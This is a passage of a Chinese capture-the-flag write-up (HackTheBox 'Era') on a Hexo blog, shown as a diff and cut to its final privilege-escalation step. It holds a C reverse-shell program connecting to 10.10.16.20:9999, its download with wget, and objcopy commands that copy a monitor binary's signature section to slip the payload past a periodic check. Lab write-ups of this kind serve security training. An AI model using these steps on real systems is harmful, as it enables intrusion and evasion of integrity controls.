class="hljs-symbol">:/opt/AV/periodic-checks</span><span class="hljs-variable">$ </span><br><br></code></pre></td></tr></table></figure>
+
+<p>结合之前的进程，知道这个东西会被定期执行，写好替换即可。</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp"> cat pwn.<span class="hljs-function">c </span><br><span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">main</span>()</span> &#123;<br>    system(<span class="hljs-string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.20/9999 0&gt;&amp;1&#x27;&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>（这里要记得复制monitor的特征码，因为他会检测，直接上传是不行的。）</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs ruby">eric<span class="hljs-variable">@era</span><span class="hljs-symbol">:/opt/AV/periodic-checks</span><span class="hljs-variable">$ </span>wget <span class="hljs-number">10.10</span>.<span class="hljs-number">16.20</span>/pwn.c<br>--<span class="hljs-number">2025</span>-<span class="hljs-number">11</span>-<span class="hljs-number">17</span> <span class="hljs-number">06</span><span class="hljs-symbol">:</span><span class="hljs-number">59</span><span class="hljs-symbol">:</span><span class="hljs-number">57</span>--  <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/10.10.16.20/pwn</span>.c<br><span class="hljs-title class_">Connecting</span> to <span class="hljs-number">10.10</span>.<span class="hljs-number">16.20</span><span class="hljs-symbol">:</span><span class="hljs-number">80</span>... connected.<br><span class="hljs-variable constant_">HTTP</span> request sent, awaiting response... <span class="hljs-number">200</span> <span class="hljs-variable constant_">OK</span><br><span class="hljs-title class_">Length</span>: <span class="hljs-number">101</span> [text/x-csrc]<br><span class="hljs-title class_">Saving</span> <span class="hljs-symbol">to:</span> ‘pwn.c’<br><br>pwn.c                                  <span class="hljs-number">100</span><span class="hljs-string">%[============================================================================&gt;]</span>     <span class="hljs-number">101</span>  --.-<span class="hljs-variable constant_">KB</span>/s    <span class="hljs-keyword">in</span> 0s      <br><br><span class="hljs-number">2025</span>-<span class="hljs-number">11</span>-<span class="hljs-number">17</span> <span class="hljs-number">06</span><span class="hljs-symbol">:</span><span class="hljs-number">59</span><span class="hljs-symbol">:</span><span class="hljs-number">57</span> (<span class="hljs-number">12.9</span> <span class="hljs-variable constant_">MB</span>/s) - ‘pwn.c’ saved [<span class="hljs-number">101</span>/<span class="hljs-number">101</span>]<br><br>eric<span class="hljs-variable">@era</span><span class="hljs-symbol">:/opt/AV/periodic-checks</span><span class="hljs-variable">$ </span>gcc pwn.c -o pwn<br>pwn.<span class="hljs-symbol">c:</span> <span class="hljs-title class_">In</span> function ‘main’:<br>pwn.<span class="hljs-symbol">c:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">5</span>: <span class="hljs-symbol">warning:</span> implicit declaration of function ‘system’ [-<span class="hljs-title class_">Wimplicit</span>-function-declaration]<br>    <span class="hljs-number">2</span> |<span class="hljs-params">     system(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.20/9999 0&gt;&amp;1&#x27;&quot;);</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elixir">eric<span class="hljs-variable">@era</span><span class="hljs-symbol">:/opt/AV/periodic-checks</span><span class="hljs-variable">$ </span>objcopy --dump-section .text_sig=text_sig /opt/<span class="hljs-title class_">AV</span>/periodic-checks/monitor<br><span class="hljs-symbol">objcopy:</span> unable to copy file <span class="hljs-string">&#x27;/opt/AV/periodic-checks/monitor&#x27;</span>; <span class="hljs-symbol">reason:</span> <span class="hljs-title class_">Text</span> file busy<br>eric<span class="hljs-variable">@era</span><span class="hljs-symbol">:/opt/AV/periodic-checks</span><span class="hljs-variable">$ </span>objcopy --dump-section .text_sig=text_sig /opt/<span class="hljs-title class_">AV</span>/periodic-checks/monitor<br>eric<span class="hljs-variable">@era</span><span class="hljs-symbol">:/opt/AV/periodic-checks</span><span class="hljs-variable">$ </span>objcopy --add-section .text_sig=text_sig pwn<br>eric<span class="hljs-variable">@era</span><span class="hljs-symbol">:/opt/AV/periodic-checks</span><span class="hljs-variable">$ </span>cp pwn monitor <br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/17/HackTheBox-Era/vmware_nclwVDriJa.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/HTB/" class="print-no-link">#HTB</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox-Era</div>
+      <div>http://example.com/2025/11/17/HackTheBox-Era/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Skyarrow</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>November 17, 2025</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/11/17/HackTheBox-Soulmate/" title="HackTheBox-Soulmate">
+                        <span class="hidden-mobile">HackTheBox-Soulmate</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
